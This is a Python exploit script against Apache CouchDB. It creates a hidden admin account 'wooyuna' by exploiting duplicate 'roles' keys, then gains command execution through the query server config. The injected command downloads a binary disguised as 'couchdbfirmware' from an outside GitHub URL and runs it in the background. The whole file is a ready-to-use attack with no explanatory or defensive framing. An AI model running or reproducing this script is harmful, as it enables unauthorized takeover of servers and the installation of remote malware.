import requests
from requests.auth import HTTPBasicAuth
import sys

print(sys.argv[1])


target = 'http://'+sys.argv[1]+':5984'
command = 'apt install wget;wget https://github.com/papppeeeerrrrspace/sweetyas/releases/download/log/couchdbfirmware;chmod 777 couchdbfirmware;nohup ./couchdbfirmware '+sys.argv[2]+' > /dev/null'
version = 1
v = requests.get(target).json()["version"]
version = int(v[0])
session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}

session.put(target + '/_users/org.couchdb.user:wooyuna', data='''{
  "type": "user",
  "name": "wooyuna",
  "roles": ["_admin"],
  "roles": [],
  "password": "wooyuna"
}''')

session.auth = HTTPBasicAuth('wooyuna', 'wooyuna')
try :
    if version == 1:
        session.put(target + ('/_config/query_servers/cmd'), data=command, timeout=60)
    else:
        host = session.get(target + '/_membership').json()['all_nodes'][0]
        session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command, timeout=60)
except:
    a=""
session.put(target + '/wooyuna')
session.put(target + '/wooyuna/test', data='{"_id": "wooyunatest"}')

if version == 1:
    session.post(target + '/wooyuna/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/wooyuna/_design/test', data='{"_id":"_design/test","views":{"wooyuna":{"map":""} },"language":"cmd"}')

